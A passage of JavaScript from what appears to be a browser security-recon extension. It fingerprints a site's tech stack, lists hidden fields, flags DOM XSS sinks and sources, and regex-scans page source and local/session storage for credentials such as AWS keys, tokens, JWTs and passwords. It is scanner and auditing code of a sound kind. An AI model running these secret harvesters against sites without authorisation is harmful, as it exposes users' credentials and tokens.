      'Astro':'JS Framework','Qwik':'JS Framework',
      'jQuery':'Library','Lodash':'Library','Moment.js':'Library','Day.js':'Library',
      'Axios':'Library','D3.js':'Library','Three.js':'Library','Chart.js':'Library',
      'GSAP':'Library','Swiper':'Library','Socket.io':'Library',
      'Bootstrap':'CSS Framework','Tailwind CSS':'CSS Framework','Bulma':'CSS Framework','Foundation':'CSS Framework',
      'Webpack':'Build Tool','Vite':'Build Tool','Parcel':'Build Tool',
      'WordPress':'CMS','Drupal':'CMS','Joomla':'CMS','Ghost':'CMS','Webflow':'CMS','Squarespace':'CMS','Wix':'CMS',
      'Shopify':'E-commerce','WooCommerce':'E-commerce','BigCommerce':'E-commerce','Magento':'E-commerce','PrestaShop':'E-commerce',
      'Google Analytics':'Analytics','Google Tag Manager':'Tag Manager','Mixpanel':'Analytics','Amplitude':'Analytics',
      'Segment':'Analytics','Heap':'Analytics','Hotjar':'Analytics','FullStory':'Analytics',
      'Matomo':'Analytics','Microsoft Clarity':'Analytics','PostHog':'Analytics','Plausible':'Analytics',
      'Facebook Pixel':'Advertising','Google Ads':'Advertising','LinkedIn Insight':'Advertising','TikTok Pixel':'Advertising',
      'reCAPTCHA':'Security','hCaptcha':'Security','CF Turnstile':'Security',
      'Stripe':'Payment','PayPal':'Payment','Braintree':'Payment',
      'Google Maps':'Maps','Mapbox':'Maps','Leaflet':'Maps',
      'Sentry':'Monitoring','Datadog RUM':'Monitoring','New Relic':'Monitoring','LogRocket':'Monitoring','Bugsnag':'Monitoring',
      'Intercom':'Live Chat','Zendesk':'Live Chat','Drift':'Live Chat','Crisp':'Live Chat','Tawk.to':'Live Chat','HubSpot Chat':'Live Chat',
      'PHP':'Language','ASP.NET':'Framework','Laravel':'Framework','Django':'Framework','Rails':'Framework',
      'Cloudflare':'CDN','jsDelivr':'CDN','unpkg':'CDN',
      'Google Fonts':'Fonts','Adobe Fonts':'Fonts',
    };

    const CAT_ORDER = ['Web Server','Language','Framework','JS Framework','Library','CSS Framework','Build Tool',
      'CMS','E-commerce','Analytics','Tag Manager','Advertising','Security','Payment','Maps',
      'Monitoring','Live Chat','CDN','Hosting','Fonts'];

    // Parse response headers for server-side signals
    const hdr = k => (respHeaders[k] || respHeaders[k.toLowerCase()] || '');
    const server   = hdr('server').toLowerCase();
    const powered  = hdr('x-powered-by').toLowerCase();
    const via      = hdr('via').toLowerCase();
    const headerTechs = [];
    const addH = (name, cat) => headerTechs.push({ name, cat });

    if (server.includes('nginx'))      addH('nginx', 'Web Server');
    else if (server.includes('apache'))addH('Apache', 'Web Server');
    else if (server.includes('iis'))   addH('IIS', 'Web Server');
    else if (server.includes('caddy')) addH('Caddy', 'Web Server');
    else if (server.includes('litespeed')) addH('LiteSpeed', 'Web Server');
    else if (server.includes('cloudflare')) addH('Cloudflare', 'CDN');
    else if (server && server !== 'unknown') addH(hdr('server'), 'Web Server');

    if (powered.includes('php'))       addH('PHP', 'Language');
    else if (powered.includes('asp.net')) addH('ASP.NET', 'Framework');
    else if (powered.includes('express')) addH('Express', 'Framework');
    else if (powered.includes('next.js')) addH('Next.js', 'JS Framework');
    else if (powered && powered !== 'unknown') addH(hdr('x-powered-by'), 'Language');

    if (hdr('cf-ray'))                 addH('Cloudflare', 'CDN');
    if (hdr('x-vercel-id') || hdr('x-vercel-cache')) addH('Vercel', 'Hosting');
    if (hdr('x-netlify-id') || powered.includes('netlify')) addH('Netlify', 'Hosting');
    if (via.includes('cloudfront') || hdr('x-amz-cf-id')) addH('AWS CloudFront', 'CDN');
    if (via.includes('fastly') || hdr('fastly-restarts')) addH('Fastly', 'CDN');
    if (hdr('x-github-request-id'))   addH('GitHub Pages', 'Hosting');
    if (hdr('fly-request-id'))         addH('Fly.io', 'Hosting');
    if (hdr('x-railway-request-id'))   addH('Railway', 'Hosting');
    if (hdr('x-render-origin-server')) addH('Render', 'Hosting');

    // Merge all detections into category buckets
    const byCategory = {};
    const seen = new Set();
    const addTech = (name, cat) => {
      if (seen.has(name)) return;
      seen.add(name);
      if (!byCategory[cat]) byCategory[cat] = [];
      byCategory[cat].push(name);
    };
    headerTechs.forEach(({ name, cat }) => addTech(name, cat));
    detected.forEach(name => addTech(name, CATS[name] || 'Other'));
    if (generator) addTech(generator, 'CMS');

    const totalDetected = seen.size;
    let html = `<div class="recon-section" id="recon-sec-tech" data-severity="info" data-section-name="Tech Stack">
      <h4>Tech Stack (${totalDetected})
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button>
      </h4>
      <div class="recon-section-body">`;

    // Response headers — one row per header with name/value grid
    const importantHeaders = ['server','x-powered-by','via','content-security-policy','strict-transport-security',
      'x-frame-options','x-content-type-options','x-xss-protection','access-control-allow-origin','x-generator'];
    const presentHeaders = importantHeaders.filter(k => respHeaders[k] || respHeaders[k.toLowerCase()]);
    if (presentHeaders.length) {
      html += `<div class="recon-item"><span class="tech-cat-label">Response Headers</span><div class="tech-hdr-table">`;
      presentHeaders.forEach(k => {
        const val = respHeaders[k] || respHeaders[k.toLowerCase()];
        html += `<div class="tech-hdr-row"><span class="tech-hdr-name">${esc(k)}</span><span class="tech-hdr-value">${esc(val)}</span></div>`;
      });
      html += `</div></div>`;
    }

    if (totalDetected === 0) {
      html += `<div class="recon-item muted">Nothing detected</div>`;
    } else {
      const orderedCats = [...CAT_ORDER, ...Object.keys(byCategory).filter(c => !CAT_ORDER.includes(c))];
      orderedCats.forEach(cat => {
        if (!byCategory[cat]) return;
        html += `<div class="recon-item"><span class="tech-cat-label">${esc(cat)}</span><div class="tech-badges">`;
        byCategory[cat].forEach(t => { html += `<span class="badge">${esc(t)}</span>`; });
        html += `</div></div>`;
      });
    }

    html += `</div></div>`;
    appendRecon(html);
  },

  async hiddenFields() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const raw = await execPage(() => {
      try {
        return JSON.stringify(Array.from(document.querySelectorAll('input[type="hidden"]')).map(el => ({
          name:  el.name,
          id:    el.id,
          value: el.value,
          form:  el.closest('form')?.id || el.closest('form')?.action || '(no form)',
        })));
      } catch { return '[]'; }
    }).catch(e => { toast(String(e), 'error'); return '[]'; });
    const fields = JSON.parse(raw);
    let html = `<div class="recon-section" id="recon-sec-hidden" data-severity="info" data-section-name="Hidden Fields"><h4>Hidden Fields (${fields.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
    if (!fields.length) {
      html += `<div class="recon-item muted">None found</div>`;
    } else {
      fields.forEach(f => {
        html += `<div class="recon-item"><b>${esc(f.name || '(unnamed)')}</b>`;
        if (f.id) html += ` <span class="muted">#${esc(f.id)}</span>`;
        html += `<span style="color:var(--text);margin-left:8px">${esc(f.value)}</span>`;
        html += ` <span class="muted">form: ${esc(f.form)}</span></div>`;
      });
    }
    html += '</div>';
    appendRecon(html);
  },

  async sourceScan() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const url = state.tabUrl;
    toast('Fetching source…', 'info');
    const { body = '', error } = await bg('FETCH', { url });
    if (error) { toast(`Fetch error: ${error}`, 'error'); return; }

    const comments = [...body.matchAll(/<!--[\s\S]*?-->/g)]
      .map(m => m[0].trim())
      .filter(c => c.length > 4 && !/^\s*$/.test(c.replace(/<!--|-->/g,'')));

    const endpointRe = /["'`](\/(?:api|v\d+|graphql|rest|admin|auth|user|account)[^\s"'`]{0,120})["'`]/gi;
    const endpoints = [...new Set([...body.matchAll(endpointRe)].map(m => m[1]))];

    const scriptSrcs = [...body.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)].map(m => m[1]);

    const sourceSev = (endpoints.length || comments.length) ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-source" data-severity="${sourceSev}" data-section-name="Source Scan"><h4>Source Scan <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;

    if (endpoints.length) {
      html += `<div class="recon-item"><b>Potential API endpoints (${endpoints.length})</b><div style="margin-top:4px">`;
      endpoints.slice(0, 60).forEach(ep => {
        html += `<div class="muted" style="font-size:13px">${esc(ep)}</div>`;
      });
      html += `</div></div>`;
    }

    if (comments.length) {
      html += `<div class="recon-item"><b>HTML comments (${comments.length})</b>`;
      comments.slice(0, 20).forEach(c => {
        html += `<pre class="code-block">${esc(c.substring(0, 300))}</pre>`;
      });
      html += `</div>`;
    }

    if (scriptSrcs.length) {
      html += `<div class="recon-item"><b>External scripts (${scriptSrcs.length})</b><div style="margin-top:4px">`;
      scriptSrcs.slice(0, 30).forEach(s => {
        html += `<div class="muted" style="font-size:13px">${esc(s)}</div>`;
      });
      html += `</div></div>`;
    }

    if (!endpoints.length && !comments.length && !scriptSrcs.length) {
      html += `<div class="recon-item muted">Nothing interesting found</div>`;
    }

    html += '</div>';
    appendRecon(html);
  },

  async domXSS() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    toast('Scanning for DOM XSS…', 'info');

    const raw = await execPage(() => {
      try {
        const SINKS = [
          { name: 'innerHTML',              re: /\.innerHTML\s*[+]?=/ },
          { name: 'outerHTML',              re: /\.outerHTML\s*[+]?=/ },
          { name: 'document.write',         re: /document\s*\.\s*write(?:ln)?\s*\(/ },
          { name: 'eval',                   re: /\beval\s*\(/ },
          { name: 'setTimeout (string)',    re: /setTimeout\s*\(\s*(?!function|=>|\(|\/\/)/ },
          { name: 'setInterval (string)',   re: /setInterval\s*\(\s*(?!function|=>|\(|\/\/)/ },
          { name: 'new Function',           re: /new\s+Function\s*\(/ },
          { name: 'insertAdjacentHTML',     re: /\.insertAdjacentHTML\s*\(/ },
          { name: 'location.href =',        re: /location\s*(?:\.\s*href)?\s*=(?!=)/ },
          { name: 'location.assign',        re: /location\s*\.\s*assign\s*\(/ },
          { name: 'location.replace',       re: /location\s*\.\s*replace\s*\(/ },
          { name: 'window.open',            re: /window\s*\.\s*open\s*\(/ },
          { name: 'src =',                  re: /\.src\s*=(?!=)/ },
          { name: 'setAttribute (href/src)',re: /\.setAttribute\s*\(\s*["'](?:href|src|action|on\w+)["']/ },
          { name: 'jQuery .html()',         re: /\$\s*\([^)]+\)\s*\.\s*html\s*\(/ },
        ];
        const SOURCES = [
          { name: 'location.hash',          re: /location\s*\.\s*hash/ },
          { name: 'location.search',        re: /location\s*\.\s*search/ },
          { name: 'location.href',          re: /location\s*\.\s*href/ },
          { name: 'document.URL',           re: /document\s*\.\s*URL/ },
          { name: 'document.referrer',      re: /document\s*\.\s*referrer/ },
          { name: 'document.baseURI',       re: /document\s*\.\s*baseURI/ },
          { name: 'window.name',            re: /window\s*\.\s*name/ },
          { name: 'URLSearchParams',        re: /URLSearchParams/ },
          { name: 'decodeURIComponent',     re: /decodeURIComponent\s*\(/ },
          { name: 'localStorage.getItem',   re: /localStorage\s*\.\s*getItem/ },
          { name: 'sessionStorage.getItem', re: /sessionStorage\s*\.\s*getItem/ },
          { name: 'document.cookie',        re: /document\s*\.\s*cookie/ },
          { name: 'postMessage data',       re: /event\s*\.\s*data/ },
          { name: '.getAttribute',          re: /\.getAttribute\s*\(/ },
        ];

        const findings = [];
        const scripts = Array.from(document.querySelectorAll('script:not([src])'));
        const allText = scripts.map(s => s.textContent).join('\n');

        scripts.forEach((script, si) => {
          const lines = script.textContent.split('\n');
          lines.forEach((line, li) => {
            const matchedSink = SINKS.find(({ re }) => re.test(line));
            if (!matchedSink) return;
            const ctx = lines.slice(Math.max(0, li - 5), li + 6).join('\n');
            const matchedSources = SOURCES.filter(({ re }) => re.test(ctx)).map(s => s.name);
            findings.push({
              sink:    matchedSink.name,
              sources: matchedSources,
              line:    line.trim().slice(0, 200),
              lineNo:  li + 1,
              script:  si + 1,
              hot:     matchedSources.length > 0,
            });
          });
        });

        // Direct taint patterns — high confidence
        [
          { name: 'eval(location…)',              re: /eval\s*\([^)]*location/ },
          { name: 'innerHTML = location…',        re: /\.innerHTML\s*=\s*[^;]*location/ },
          { name: 'document.write(location…)',    re: /document\.write(?:ln)?\s*\([^)]*location/ },
          { name: 'innerHTML = decodeURI…',       re: /\.innerHTML\s*=\s*[^;]*decodeURI/ },
        ].forEach(({ name, re }) => {
          if (re.test(allText)) findings.push({ sink: name, sources: ['direct taint'], line: 'Direct source-to-sink detected', lineNo: null, script: null, hot: true });
        });

        // postMessage listener — flag for manual review
        if (/addEventListener\s*\(\s*['"]message['"]/.test(allText)) {
          findings.push({ sink: 'postMessage listener', sources: ['event.data'], line: 'addEventListener("message") found — verify handler sanitises event.data before use in sink', lineNo: null, script: null, hot: true });
        }

        return JSON.stringify(findings);
      } catch { return '[]'; }
    }).catch(() => '[]');

    const findings = JSON.parse(raw);
    const hot      = findings.filter(f => f.hot);
    const cold     = findings.filter(f => !f.hot);

    const domxssSev = hot.length > 0 ? 'high' : cold.length > 0 ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-domxss" data-severity="${domxssSev}" data-section-name="DOM XSS"><h4>DOM XSS (${hot.length} potential, ${cold.length} sinks only) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;

    if (!findings.length) {
      html += '<div class="recon-item muted">No dangerous sink patterns found in inline scripts</div>';
    } else {
      if (hot.length) {
        html += `<div class="recon-item"><span class="tech-cat-label">Potential DOM XSS — sink + source in context</span>`;
        hot.forEach(f => {
          const loc = f.lineNo ? `script ${f.script} line ${f.lineNo}` : '';
          html += `<div class="domxss-row domxss-hot">
            <div class="domxss-meta">
              <span class="domxss-sink">${esc(f.sink)}</span>
              ${loc ? `<span class="muted domxss-loc">${esc(loc)}</span>` : ''}
            </div>
            <div class="domxss-sources">${f.sources.map(s => `<span class="badge">${esc(s)}</span>`).join('')}</div>
            <div class="domxss-line">${esc(f.line)}</div>
          </div>`;
        });
        html += '</div>';
      }
      if (cold.length) {
        html += `<div class="recon-item"><span class="tech-cat-label">Dangerous sinks (no source detected nearby)</span>`;
        cold.forEach(f => {
          const loc = f.lineNo ? `script ${f.script} line ${f.lineNo}` : '';
          html += `<div class="domxss-row">
            <div class="domxss-meta">
              <span class="domxss-sink domxss-sink-warn">${esc(f.sink)}</span>
              ${loc ? `<span class="muted domxss-loc">${esc(loc)}</span>` : ''}
            </div>
            <div class="domxss-line">${esc(f.line)}</div>
          </div>`;
        });
        html += '</div>';
      }
    }

    html += '</div>';
    appendRecon(html);
  },

  async secrets() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    toast('Scanning for secrets…', 'info');

    const domRaw = await execPage(() => {
      try {
        const scripts  = Array.from(document.querySelectorAll('script:not([src])')).map(s => s.textContent).join('\n');
        const attrs    = Array.from(document.querySelectorAll('[data-key],[data-token],[data-secret],[data-api-key],[data-config]')).map(el => el.outerHTML).join('\n');
        const metas    = Array.from(document.querySelectorAll('meta')).map(m => m.outerHTML).join('\n');
        const comments = (document.documentElement.innerHTML.match(/<!--[\s\S]*?-->/g) || []).join('\n');
        return JSON.stringify({ scripts, attrs, metas, comments });
      } catch { return '{}'; }
    }).catch(() => '{}');

    let source = '';
    if (isHttpUrl(state.tabUrl)) {
      const resp = await bg('FETCH', { url: state.tabUrl, maxBody: 150000 }).catch(() => null);
      source = resp?.body || '';
    }

    const { scripts = '', attrs = '', metas = '', comments = '' } = JSON.parse(domRaw);
    const corpus = [
      { label: 'Inline Scripts', text: scripts },
      { label: 'DOM Attributes', text: attrs },
      { label: 'Meta Tags',      text: metas },
      { label: 'HTML Comments',  text: comments },
      { label: 'Page Source',    text: source },
    ];

    const SECRET_PATTERNS = [
      { name: 'AWS Access Key',    re: /AKIA[0-9A-Z]{16}/g },
      { name: 'GitHub Token',      re: /ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}/g },
      { name: 'Google API Key',    re: /AIza[0-9A-Za-z\-_]{35}/g },
      { name: 'Stripe Key',        re: /(?:pk|sk)_(?:test|live)_[0-9a-zA-Z]{24,}/g },
      { name: 'Slack Token',       re: /xox[baprs]-[0-9a-zA-Z]{10,}-[0-9a-zA-Z-]+/g },
      { name: 'JWT',               re: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g },
      { name: 'Private Key',       re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY/g },
      { name: 'NPM Token',         re: /npm_[A-Za-z0-9]{36}/g },
      { name: 'SendGrid Key',      re: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g },
      { name: 'Firebase URL',      re: /https:\/\/[a-z0-9-]+\.firebaseio\.com/g },
      { name: 'MongoDB URI',       re: /mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g },
      { name: 'Basic Auth in URL', re: /https?:\/\/[^:@\s"'<>]+:[^:@\s"'<>]+@[^\s"'<>]+/g },
      { name: 'Password in JS',    re: /(?:password|passwd|pwd)\s*[:=]\s*["'][^"']{4,64}["']/gi },
      { name: 'API Key in JS',     re: /api[_-]?key\s*[:=]\s*["'][^"']{8,64}["']/gi },
      { name: 'Secret in JS',      re: /(?<![a-z])(?:secret|token)\s*[:=]\s*["'][^"']{8,64}["']/gi },
      { name: 'Bearer Token',      re: /Bearer\s+[A-Za-z0-9\-._~+/]+=*/g },
    ];

    const findings = [];
    const seen = new Set();
    corpus.forEach(({ label, text }) => {
      if (!text) return;
      SECRET_PATTERNS.forEach(({ name, re }) => {
        re.lastIndex = 0;
        let m;
        while ((m = re.exec(text)) !== null) {
          const key = `${name}:${m[0]}`;
          if (seen.has(key)) continue;
          seen.add(key);
          findings.push({ pattern: name, match: m[0], location: label });
          if (findings.length >= 200) return;
        }
      });
    });

    const SECRET_HIGH = new Set(['JWT','AWS Access Key','Private Key','GitHub Token','Stripe Key','Bearer Token','MongoDB URI','Basic Auth in URL','Password in JS','NPM Token','SendGrid Key','Google API Key','Slack Token']);
    const secretsSev = findings.some(f => SECRET_HIGH.has(f.pattern)) ? 'high' : findings.length > 0 ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-secrets" data-severity="${secretsSev}" data-section-name="Secrets"><h4>Secrets &amp; Sensitive Data (${findings.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;

    if (!findings.length) {
      html += '<div class="recon-item muted">No secrets detected</div>';
    } else {
      const byPattern = {};
      findings.forEach(f => { (byPattern[f.pattern] ??= []).push(f); });
      Object.entries(byPattern).forEach(([pattern, items]) => {
        html += `<div class="recon-item"><span class="tech-cat-label">${esc(pattern)}</span>`;
        items.slice(0, 10).forEach(f => {
          const display = f.match.length > 80 ? f.match.slice(0, 77) + '…' : f.match;
          html += `<div class="secrets-row">
            <span class="secrets-match" title="${esc(f.match)}">${esc(display)}</span>
            <span class="muted secrets-loc">${esc(f.location)}</span>
            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">⧉</button>
          </div>`;
        });
        if (items.length > 10) html += `<div class="muted" style="font-size:12px;margin-top:4px">+${items.length - 10} more</div>`;
        html += `</div>`;
      });
    }

    html += '</div>';
    appendRecon(html);
  },

  async runAll() {
    $('recon-output').innerHTML = '';
    const btn = $('recon-run-all');
    btn.disabled = true;
    btn.textContent = 'Running…';
    // Run in reverse display order — each scan prepends, so last = top
    const scans = [
      () => this.forms(),
      () => this.links(),
      () => this.hiddenFields(),
      () => this.techStack(),
      () => this.sourceScan(),
      () => this.domXSS(),
      () => this.storageScan(),
      () => this.secrets(),
    ];
    for (const scan of scans) await scan().catch(() => {});
    btn.disabled = false;
    btn.textContent = 'Run All';
  },

  async storageScan() {
    const [localRaw, sessionRaw] = await Promise.all([
      execPage(readStorageNamespace, ['localStorage']).catch(() => '{}'),
      execPage(readStorageNamespace, ['sessionStorage']).catch(() => '{}'),
    ]);

    let local, session;
    try { local   = JSON.parse(localRaw);   } catch { local   = {}; }
    try { session = JSON.parse(sessionRaw); } catch { session = {}; }

    const PATTERNS = [
      { name: 'JWT',               re: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g },
      { name: 'Bearer Token',      re: /Bearer\s+[A-Za-z0-9\-._~+/]+=*/g },
      { name: 'AWS Access Key',    re: /AKIA[0-9A-Z]{16}/g },
      { name: 'GitHub Token',      re: /ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}/g },
      { name: 'Google API Key',    re: /AIza[0-9A-Za-z\-_]{35}/g },
      { name: 'Stripe Key',        re: /(?:pk|sk)_(?:test|live)_[0-9a-zA-Z]{24,}/g },
      { name: 'Slack Token',       re: /xox[baprs]-[0-9a-zA-Z]{10,}-[0-9a-zA-Z-]+/g },
      { name: 'Private Key',       re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY/g },
      { name: 'NPM Token',         re: /npm_[A-Za-z0-9]{36}/g },
      { name: 'SendGrid Key',      re: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g },
      { name: 'MongoDB URI',       re: /mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g },
      { name: 'Basic Auth in URL', re: /https?:\/\/[^:@\s"'<>]+:[^:@\s"'<>]+@[^\s"'<>]+/g },
      { name: 'Password',          re: /(?:password|passwd|pwd)\s*[:=]\s*["']?[^"'\s,;]{4,64}/gi },
      { name: 'API Key',           re: /api[_-]?key\s*[:=]\s*["']?[^"'\s,;]{8,64}/gi },
      { name: 'Secret / Token',    re: /(?<![a-z])(?:secret|token)\s*[:=]\s*["']?[^"'\s,;]{8,64}/gi },
      { name: 'Email Address',     re: /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g },
      { name: 'Session ID',        re: /[a-f0-9]{32,}|[A-Za-z0-9+/]{40,}={0,2}/g },
    ];

    const SENSITIVE_KEYS = /token|auth|session|secret|password|passwd|pwd|credential|jwt|access|refresh|api.?key|user|email|phone|ssn|card|cvv/i;

    const findings = [];
    const seen = new Set();

    const sources = [
      { store: 'localStorage',   data: local   },
      { store: 'sessionStorage', data: session },
    ];

    sources.forEach(({ store, data }) => {
      Object.entries(data).forEach(([key, value]) => {
        const combined = `${key}=${value}`;

        // Flag sensitive-looking key names even without a pattern match
        if (SENSITIVE_KEYS.test(key)) {
          const seenKey = `Sensitive Key:${store}:${key}`;
          if (!seen.has(seenKey)) {
            seen.add(seenKey);
            const display = String(value).length > 80 ? String(value).slice(0, 77) + '…' : String(value);
            findings.push({ pattern: 'Sensitive Key Name', match: display, key, store });
          }
        }

        // Run regex patterns against the full key=value string
        PATTERNS.forEach(({ name, re }) => {
          re.lastIndex = 0;
          let m;
          while ((m = re.exec(combined)) !== null) {
            const seenKey = `${name}:${m[0]}`;
            if (seen.has(seenKey)) continue;
            seen.add(seenKey);
            findings.push({ pattern: name, match: m[0], key, store });
            if (findings.length >= 300) return;
          }
        });
      });
    });

    const STORAGE_HIGH = new Set(['JWT','AWS Access Key','Private Key','GitHub Token','Stripe Key','Bearer Token','MongoDB URI','Basic Auth in URL','Password','NPM Token','SendGrid Key','Google API Key','Slack Token']);
    const storageSev = findings.some(f => STORAGE_HIGH.has(f.pattern)) ? 'high' : findings.length > 0 ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-storage" data-severity="${storageSev}" data-section-name="Storage Scan"><h4>Storage Sensitive Data (${findings.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;

    const localCount   = Object.keys(local).length;
    const sessionCount = Object.keys(session).length;
    html += `<div class="recon-item muted" style="font-size:12px">Scanned ${localCount} localStorage + ${sessionCount} sessionStorage entries</div>`;

    if (!findings.length) {
      html += '<div class="recon-item muted">No sensitive data detected</div>';
    } else {
      const byPattern = {};
      findings.forEach(f => { (byPattern[f.pattern] ??= []).push(f); });
      Object.entries(byPattern).forEach(([pattern, items]) => {
        html += `<div class="recon-item"><span class="tech-cat-label">${esc(pattern)}</span>`;
        items.slice(0, 10).forEach(f => {
          const display = f.match.length > 80 ? f.match.slice(0, 77) + '…' : f.match;
          html += `<div class="secrets-row">
            <span class="secrets-match" title="${esc(f.match)}">${esc(display)}</span>
            <span class="muted secrets-loc">${esc(f.store)} › ${esc(f.key)}</span>
            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">⧉</button>
          </div>`;
        });
        if (items.length > 10) html += `<div class="muted" style="font-size:12px;margin-top:4px">+${items.length - 10} more</div>`;
        html += `</div>`;
      });
    }

    html += '</div>';
    appendRecon(html);
  },
};

function appendRecon(html) {
  $('recon-output').insertAdjacentHTML('afterbegin', html);
  renderSummaryBar();
}

function renderSummaryBar() {
  document.getElementById('recon-summary-bar')?.remove();
  const sections = Array.from($$('.recon-section[data-severity]'));
  if (!sections.length) return;

  const highs = [], meds = [], infos = [];
  sections.forEach(s => {
    const entry = { name: s.dataset.sectionName || s.id, id: s.id };
    if      (s.dataset.severity === 'high') highs.push(entry);
    else if (s.dataset.severity === 'med')  meds.push(entry);
    else                                    infos.push(entry);
  });

  let bar = `<div id="recon-summary-bar" class="recon-summary-bar"><span class="sum-label">Summary</span>`;
  if (highs.length) {
    bar += `<span class="sum-badge sum-high">HIGH</span>`;
    highs.forEach(h => bar += `<a class="sum-link" data-scroll-to="${h.id}">${esc(h.name)}</a>`);
  }
  if (meds.length) {
    bar += `<span class="sum-badge sum-med">MED</span>`;
    meds.forEach(m => bar += `<a class="sum-link" data-scroll-to="${m.id}">${esc(m.name)}</a>`);
  }
  if (infos.length) {
    bar += `<span class="sum-badge sum-info">INFO</span>`;
    infos.forEach(i => bar += `<a class="sum-link" data-scroll-to="${i.id}">${esc(i.name)}</a>`);
  }
  bar += `</div>`;
  $('recon-output').insertAdjacentHTML('afterbegin', bar);
}

// ─── Recon → Markdown ─────────────────────────────────────────────────────────

// Escape characters that break Markdown structure when they appear in data values.
function escMd(s) {
  return String(s ?? '')
    .replace(/\\/g, '\\\\')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\*/g, '\\*')
    .replace(/`/g, "'");
}

// Walk direct child nodes for generic items (forms, hidden fields, source scan text).
// Handles <b> → **bold**, strips buttons, escapes everything else.
function walkItemNodes(nodes) {
  const parts = [];
  nodes.forEach(node => {
    if (node.nodeType === Node.TEXT_NODE) {
      const t = escMd(node.textContent);
      if (t.trim()) parts.push(t);
    } else if (node.nodeType === Node.ELEMENT_NODE) {
      const tag = node.tagName.toLowerCase();
      const cls = node.className || '';
      if (tag === 'button' || cls.includes('recon-copy-btn')) return;
      if (tag === 'b' || tag === 'strong') {
        parts.push(`**${escMd(node.textContent.trim())}**`);
      } else if (tag === 'pre' || cls.includes('code-block')) {
        parts.push(`\n\`\`\`\n${node.textContent.trim()}\n\`\`\``);
      } else {
        const sub = walkItemNodes(node.childNodes);
        if (sub.trim()) parts.push(sub);
        if (['div', 'p'].includes(tag) && sub.trim()) parts.push('\n');
      }
    }
  });
  return parts.join('');
}

function sectionToMarkdown(section) {
  const h4 = section.querySelector(':scope > h4');
  const title = h4
    ? Array.from(h4.childNodes)
        .filter(n => !(n.nodeType === Node.ELEMENT_NODE && n.tagName === 'BUTTON'))
        .map(n => n.textContent).join('').replace(/⧉/g, '').trim()
    : (section.dataset.sectionName || '');

  const lines = [`## ${title}`, ''];

  const body = section.querySelector('.recon-section-body') || section;
  body.querySelectorAll('.recon-item').forEach(item => {
    // ── Category label (tech stack subcategories, secrets groupings) ──
    const cat = item.querySelector(':scope > .tech-cat-label');
    if (cat) lines.push(`### ${escMd(cat.textContent.trim())}`);

    // ── Response headers table ──
    const hdrTable = item.querySelector('.tech-hdr-table');
    if (hdrTable) {
      hdrTable.querySelectorAll('.tech-hdr-row').forEach(row => {
        const n = escMd(row.querySelector('.tech-hdr-name')?.textContent.trim() ?? '');
        const v = escMd(row.querySelector('.tech-hdr-value')?.textContent.trim() ?? '');
        lines.push(`- **${n}**: ${v}`);
      });
      lines.push('');
      return;
    }

    // ── Tech badges ──
    const techBadges = item.querySelector('.tech-badges');
    if (techBadges) {
      lines.push(Array.from(techBadges.querySelectorAll('.badge'))
        .map(b => escMd(b.textContent.trim())).join(', '));
      lines.push('');
      return;
    }

    // ── Secrets rows ──
    const secretsRows = item.querySelectorAll('.secrets-row');
    if (secretsRows.length) {
      secretsRows.forEach(row => {
        const match = row.querySelector('.secrets-match')?.getAttribute('title')
                   || row.querySelector('.secrets-match')?.textContent.trim() || '';
        const loc   = row.querySelector('.secrets-loc')?.textContent.trim() || '';
        lines.push(`- ${escMd(match)}${loc ? `  *(${escMd(loc)})*` : ''}`);
      });
      lines.push('');
      return;
    }

    // ── DOM XSS rows ──
    const domxssRows = item.querySelectorAll('.domxss-row');
    if (domxssRows.length) {
      domxssRows.forEach(row => {
        const sink     = row.querySelector('.domxss-sink,.domxss-sink-warn')?.textContent.trim() || '';
        const loc      = row.querySelector('.domxss-loc')?.textContent.trim() || '';
        const sources  = Array.from(row.querySelectorAll('.domxss-sources .badge'))
                           .map(b => escMd(b.textContent.trim()));
        const codeLine = row.querySelector('.domxss-line')?.textContent.trim() || '';
        lines.push(`- **${escMd(sink)}**${loc ? ` *(${escMd(loc)})*` : ''}`);
        if (sources.length) lines.push(`  - Sources: ${sources.join(', ')}`);
        if (codeLine) lines.push(`  - ${escMd(codeLine)}`);
      });
      lines.push('');
      return;
    }

    // ── Spider links ──
    const spiderLines = item.querySelectorAll('.recon-spider-line');
    if (spiderLines.length) {
      const domain = item.querySelector('b')?.textContent.trim() || '';
